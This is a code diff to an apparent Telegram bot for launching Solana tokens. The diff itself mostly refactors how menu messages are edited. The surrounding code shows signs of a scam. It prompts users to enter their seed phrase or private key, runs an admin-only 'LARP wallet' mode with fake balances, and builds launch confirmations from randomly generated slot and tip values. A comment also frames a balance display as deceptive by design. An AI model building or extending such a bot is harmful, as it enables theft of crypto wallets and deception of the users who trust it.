@@ -1759,43 +1759,61 @@ async def send_main_menu(target, sess: UserSession, *, edit: bool = False):
     caption = build_main_menu_text(sess)
     kb = main_menu_kb()
     img = welcome_image_path()
-    bot = target.bot if hasattr(target, "bot") else None
 
     # CallbackQuery path (edit existing message when possible)
     if edit and hasattr(target, "message"):
         msg = target.message
         try:
             if img:
-                media = InputMediaPhoto(
-                    media=FSInputFile(img),
+                # Prefer edit_media when current message already has media; else delete+send photo
+                if msg.photo or msg.video or msg.document:
+                    media = InputMediaPhoto(
+                        media=FSInputFile(img),
+                        caption=caption,
+                        parse_mode=ParseMode.HTML,
+                    )
+                    await msg.edit_media(media=media, reply_markup=kb)
+                    return
+                # Text message → cannot edit into photo; replace
+                try:
+                    await msg.delete()
+                except Exception:
+                    pass
+                await target.message.answer_photo(
+                    photo=FSInputFile(img),
                     caption=caption,
+                    reply_markup=kb,
                     parse_mode=ParseMode.HTML,
                 )
-                await msg.edit_media(media=media, reply_markup=kb)
                 return
-            # No image: plain text edit (or caption if current msg is photo)
+            # No image file: text-only menu
             if msg.photo:
-                await msg.edit_caption(caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML)
+                try:
+                    await msg.delete()
+                except Exception:
+                    pass
+                await target.message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
             else:
                 await msg.edit_text(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
             return
         except Exception:
-            # Fallback: delete old + send fresh menu message
             try:
                 await msg.delete()
             except Exception:
                 pass
 
-    # Fresh send ( /start or fallback )
+    # Fresh send (/start or fallback)
+    answer = target.answer if hasattr(target, "answer") else target.message.answer
+    answer_photo = target.answer_photo if hasattr(target, "answer_photo") else target.message.answer_photo
     if img:
-        await target.answer_photo(
+        await answer_photo(
             photo=FSInputFile(img),
             caption=caption,
             reply_markup=kb,
             parse_mode=ParseMode.HTML,
         )
     else:
-        await target.answer(
+        await answer(
             caption,
             reply_markup=kb,
             parse_mode=ParseMode.HTML,
@@ -1838,6 +1856,31 @@ class SettingsStates(StatesGroup):
 router = Router()
 
 
+
+async def safe_edit_message(cb: CallbackQuery, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
+    """Edit callback message to plain text. Handles photo menus (no text to edit)."""
+    msg = cb.message
+    try:
+        if msg.photo:
+            # Photo messages cannot become text via edit_text — delete + resend
+            try:
+                await msg.delete()
+            except Exception:
+                pass
+            await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
+            return
+        await msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
+    except Exception:
+        try:
+            await msg.delete()
+        except Exception:
+            pass
+        try:
+            await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
+        except Exception:
+            pass
+
+
 @router.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
@@ -1861,7 +1904,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
 
     elif action == "launch":
         text = "<b>Token name</b>  (1–50 chars)\n\nEnter a name for your token:"
-        await cb.message.edit_text(text, reply_markup=cancel_kb(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=cancel_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(LaunchStates.waiting_name)
 
     elif action == "wallets":
@@ -1878,7 +1921,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             for i, w in enumerate(sess.wallets):
                 badge = "  [active]" if i == sess.active_wallet_idx else ""
                 text += f"<b>{i+1}.</b>  <code>{short_addr(w.public_key)}</code>{badge}\n      {w.label}  ·  {w.balance_sol:.4f} SOL\n\n"
-        await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)
 
     elif action == "portfolio":
         text = "<b>Portfolio</b>\n────────────────────\n\n"
@@ -1911,7 +1954,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             for m in live_mints[:2]:
                 kb.row(InlineKeyboardButton(text=f"Sell all  {mask_mint(m)}", callback_data=f"dump:{m}"))
         kb.row(InlineKeyboardButton(text="← Menu", callback_data="menu:main"))
-        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
         text = (
@@ -1919,7 +1962,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             f"Launches remaining: <b>{sess.launches_left}</b>\n\n"
             "Enter a promo code or purchase additional launches below."
         )
-        await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "tx":
         text = "<b>Tx tracker</b>\n────────────────────\n\n"
@@ -1971,7 +2014,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
                     text += "────────────────────\n<b>Network</b>\n"
                 text += "".join(global_lines)
 
-        await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "settings":
         s = sess.settings
@@ -1984,7 +2027,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             f"Sniper guard   <b>{sniper_str}</b>\n"
             f"MEV guard      <b>{mev_str}</b>"
         )
-        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
 
     elif action == "balance":
         # Ops pool — looks like internal infrastructure float, not a personal vault
@@ -2007,7 +2050,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
         kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
-        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     await cb.answer()
 
@@ -2022,12 +2065,12 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
     elif key == "fee":
         sess.settings["priority_fee"] = float(parts[2])
     elif key == "custom_slip":
-        await cb.message.edit_text("Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, "Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SettingsStates.waiting_custom_slip)
         await cb.answer()
         return
     elif key == "custom_fee":
-        await cb.message.edit_text("Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, "Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SettingsStates.waiting_custom_fee)
         await cb.answer()
         return
@@ -2045,7 +2088,7 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
         f"Sniper guard   <b>{sniper_str}</b>\n"
         f"MEV guard      <b>{mev_str}</b>"
     )
-    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
+    await safe_edit_message(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
     await cb.answer("Updated")
 
 
@@ -2107,7 +2150,7 @@ async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
     ])
-    await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
+    await safe_edit_message(cb, text, reply_markup=kb, parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_import)
     await cb.answer()
 
@@ -2315,13 +2358,13 @@ async def wallet_clear(cb: CallbackQuery):
     sess.larp_wallet_idx = None
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS:
         ensure_larp_wallet(sess)
-        await cb.message.edit_text(
+        await safe_edit_message(cb, 
             "🗑 Real wallets cleared.\nLARP wallet re-seeded (mode still ON).",
             reply_markup=back_menu_kb(),
             parse_mode=ParseMode.HTML,
         )
     else:
-        await cb.message.edit_text("🗑 All wallets removed from session.", reply_markup=back_menu_kb())
+        await safe_edit_message(cb, "🗑 All wallets removed from session.", reply_markup=back_menu_kb())
     await cb.answer()
 
 
@@ -2356,7 +2399,7 @@ async def wallet_refresh(cb: CallbackQuery):
     for i, w in enumerate(sess.wallets):
         badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
         text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
-    await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
+    await safe_edit_message(cb, text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
 
 
 @router.callback_query(F.data == "wallet:rename")
@@ -2365,7 +2408,7 @@ async def wallet_rename(cb: CallbackQuery, state: FSMContext):
     if not sess.wallets:
         await cb.answer("No wallets", show_alert=True)
         return
-    await cb.message.edit_text(f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+    await safe_edit_message(cb, f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_label)
     await cb.answer()
 
@@ -2466,7 +2509,7 @@ async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
     except Exception:
         bundle = 10
     await state.update_data(bundle=bundle)
-    await cb.message.edit_text(
+    await safe_edit_message(cb, 
         f"✅ <b>Bundle size set:</b> {bundle} wallets\n\n"
         "🔗 <b>Add socials</b> (optional): choose a platform or skip.",
         reply_markup=socials_kb(),
@@ -2481,7 +2524,7 @@ async def social_pick(cb: CallbackQuery, state: FSMContext):
     platform = cb.data.split(":")[1]
     labels = {"x": "X / Twitter URL", "tg": "Telegram URL", "web": "Website URL", "ig": "Instagram URL"}
     await state.update_data(_social_pending=platform)
-    await cb.message.edit_text(
+    await safe_edit_message(cb, 
         f"Send {labels.get(platform, 'URL')}:",
         reply_markup=cancel_kb(),
         parse_mode=ParseMode.HTML,
@@ -2511,7 +2554,7 @@ async def socials_done(cb: CallbackQuery, state: FSMContext):
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS and not sess.wallets:
         ensure_larp_wallet(sess)
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
-    await cb.message.edit_text(
+    await safe_edit_message(cb, 
         "💰 <b>Dev buy / invest amount</b>\n\n"
         f"Your balance: <b>{SOL_EMOJI} {bal:.4f}</b>\n"
         "Minimum: <b>3 SOL</b>\n\n"
@@ -2527,7 +2570,7 @@ async def socials_done(cb: CallbackQuery, state: FSMContext):
 async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
     part = cb.data.split(":")[1]
     if part == "custom":
-        await cb.message.edit_text(
+        await safe_edit_message(cb, 
             "✏️ Send invest amount in SOL (minimum <b>3</b>):",
             reply_markup=cancel_kb(),
             parse_mode=ParseMode.HTML,
@@ -2581,7 +2624,7 @@ async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: fl
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
     if invest > bal + 1e-9:
         await cb.answer()
-        await cb.message.edit_text(
+        await safe_edit_message(cb, 
             f"❌ <b>Insufficient balance</b>\n\n"
             f"You tried to invest <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{bal:.4f} SOL</b>",
@@ -2655,7 +2698,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
 
     if not sess.wallets:
         await cb.answer()
-        await cb.message.edit_text(
+        await safe_edit_message(cb, 
             "🔒 <b>Connect a wallet</b>\n\n"
             "Enter your 12 or 24-word seed phrase\n"
             "(or private key) to continue.",
@@ -2668,7 +2711,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     active = sess.wallets[sess.active_wallet_idx]
     if invest > active.balance_sol + 1e-9:
         await cb.answer()
-        await cb.message.edit_text(
+        await safe_edit_message(cb, 
             f"❌ <b>Insufficient balance</b>\n\n"
             f"Invest: <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{active.balance_sol:.4f} SOL</b>",
@@ -2693,7 +2736,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     slot = random.randint(280_000_000, 320_000_000)
     tip = round(random.uniform(0.005, 0.03), 4)
 
-    await cb.message.edit_text(
+    await safe_edit_message(cb, 
         f"<b>${symbol}</b> · launch queued\n"
         f"{name}\n\n"
         f"Invest <code>{invest:.4f} SOL</code> · bundle ×{bundle}\n"
@@ -2794,7 +2837,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
         f"Sniper guard ON · dump when ready"
     )
     try:
-        await cb.message.edit_text(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb, text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
     except Exception:
         await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
     await state.clear()
@@ -3138,7 +3181,7 @@ async def dump_all(cb: CallbackQuery):
         await asyncio.sleep(delay)
 
     try:
-        await cb.message.edit_text(
+        await safe_edit_message(cb, 
             f"<b>${symbol}</b>  [sold]\n"
             f"<code>{mask_mint(mint)}</code>\n\n"
             f"{bundle}/{bundle} wallets sold\n"
@@ -3178,7 +3221,7 @@ async def dump_reset(cb: CallbackQuery):
 # ── Promo ───────────────────────────────────────────────────────────────────
 @router.callback_query(F.data == "promo:enter")
 async def promo_enter(cb: CallbackQuery, state: FSMContext):
-    await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+    await safe_edit_message(cb, "🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(PromoStates.waiting_code)
     await cb.answer()
 
@@ -3219,7 +3262,7 @@ async def promo_pay(cb: CallbackQuery):
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
     kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
-    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
+    await safe_edit_message(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
     await cb.answer()
 
 
